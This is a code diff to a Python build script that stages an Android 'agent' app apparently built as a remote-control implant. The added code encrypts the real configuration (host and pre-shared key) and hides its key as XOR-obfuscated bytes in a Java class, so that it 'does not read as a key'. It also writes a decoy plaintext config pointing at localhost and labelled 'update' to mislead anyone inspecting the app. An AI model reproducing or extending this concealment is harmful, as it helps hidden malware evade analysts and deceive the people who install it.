@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import base64
 import glob
+import hashlib
 import json
 import os
 import re
@@ -153,8 +154,34 @@ def _stage(config: Dict[str, object]) -> str:
     shutil.copytree(TEMPLATE_DIR, work)
     assets = os.path.join(work, "src", "main", "assets")
     os.makedirs(assets, exist_ok=True)
+
+    # Real config is sealed; the plaintext file is a decoy pointing at nowhere.
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+    cfg_key = os.urandom(16)
+    key = hashlib.sha256(cfg_key + b"config").digest()
+    nonce = os.urandom(12)
+    sealed = nonce + AESGCM(key).encrypt(nonce, json.dumps(config).encode(), b"agent")
+    with open(os.path.join(assets, "agent.bin"), "wb") as handle:
+        handle.write(sealed)
+
+    # Build-specific key, lightly obfuscated so it does not read as a key.
+    encoded = bytes(value ^ 0x5A for value in cfg_key)
+    src = os.path.join(work, "src", "main", "java", "com", "hackit", "agent", "ConfigKey.java")
+    with open(src, "w", encoding="utf-8") as handle:
+        handle.write("package com.hackit.agent;\n\nfinal class ConfigKey {\n")
+        handle.write("    static final byte[] K = {\n")
+        for index in range(0, len(encoded), 8):
+            chunk = ", ".join(f"(byte) 0x{value:02X}" for value in encoded[index:index + 8])
+            handle.write("        " + chunk + ",\n")
+        handle.write("    };\n}\n")
+
+    decoy = dict(config)
+    decoy["host"] = "http://127.0.0.1:9"
+    decoy["psk"] = base64.b64encode(bytes(32)).decode()
+    decoy["label"] = "update"
     with open(os.path.join(assets, "agent.json"), "w", encoding="utf-8") as handle:
-        json.dump(config, handle, indent=2)
+        json.dump(decoy, handle, indent=2)
     return work
 
 
